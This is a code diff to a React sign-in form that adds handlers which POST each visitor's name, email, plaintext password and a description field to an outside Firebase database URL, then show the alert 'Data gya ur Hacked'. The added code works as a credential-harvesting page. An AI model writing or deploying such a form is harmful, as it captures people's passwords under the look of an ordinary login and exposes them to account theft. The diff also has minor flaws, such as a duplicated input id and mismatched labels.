@@ -1,6 +1,46 @@
-import React from "react";
+import React, { useState } from "react";
 
 export default function SignIn() {
+  const [user, setUser] = useState({
+    name: "",
+    email: "",
+    password: "",
+    discription: "",
+  });
+
+  let name, value;
+  const getUserdata = (event) => {
+    name = event.target.name;
+    value = event.target.value;
+    setUser({ ...user, [name]: value });
+  };
+  const postData = async (e) => {
+    e.preventDefault();
+    const { name, email, password, discription } = user;
+    const res = await fetch(
+      "https://aman-jai-singh-default-rtdb.firebaseio.com/aman.json",
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          name,
+          email,
+          password,
+          discription,
+        }),
+      }
+    );
+    if (res) {
+      setUser({
+        name: "",
+        email: "",
+        password: "",
+        discription: "",
+      });
+
+      alert("Data gya ur Hacked");
+    }
+  };
   return (
     <div className="min-h-screen flex items-center justify-center bg-gray-50  py-12 px-4 sm:px-6 lg:px-8 ">
       <div className="max-w-md w-full space-y-8 ">
@@ -23,18 +63,37 @@ export default function SignIn() {
             </a>
           </p>
         </div>
-        <form className="mt-8 space-y-6" action="#" method="POST">
+        <form className="mt-8 space-y-6" method="POST">
           <input type="hidden" name="remember" defaultValue="true" />
+
           <div className="rounded-md shadow-sm -space-y-px">
+            <div>
+              <label htmlFor="email-address" className="sr-only">
+                Name
+              </label>
+              <input
+                id="name"
+                value={user.name}
+                name="name"
+                type="text"
+                autoComplete="off"
+                onChange={getUserdata}
+                required
+                className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm"
+                placeholder="Name"
+              />
+            </div>
             <div>
               <label htmlFor="email-address" className="sr-only">
                 Email address
               </label>
               <input
+                value={user.email}
+                onChange={getUserdata}
                 id="email-address"
                 name="email"
                 type="email"
-                autoComplete="email"
+                autoComplete="off"
                 required
                 className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm"
                 placeholder="Email address"
@@ -45,13 +104,31 @@ export default function SignIn() {
                 Password
               </label>
               <input
+                value={user.password}
                 id="password"
                 name="password"
                 type="password"
-                autoComplete="current-password"
+                autoComplete="off"
+                onChange={getUserdata}
                 required
                 className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm"
                 placeholder="Password"
+              />
+            </div>
+            <div>
+              <label htmlFor="password" className="sr-only">
+                Discription
+              </label>
+              <input
+                id="password"
+                onChange={getUserdata}
+                value={user.discription}
+                name="discription"
+                type="text"
+                autoComplete=""
+                required
+                className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm"
+                placeholder="Discription"
               />
             </div>
           </div>
@@ -85,6 +162,7 @@ export default function SignIn() {
           <div>
             <button
               type="submit"
+              onClick={postData}
               className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
             >
               <span className="absolute left-0 inset-y-0 flex items-center pl-3"></span>
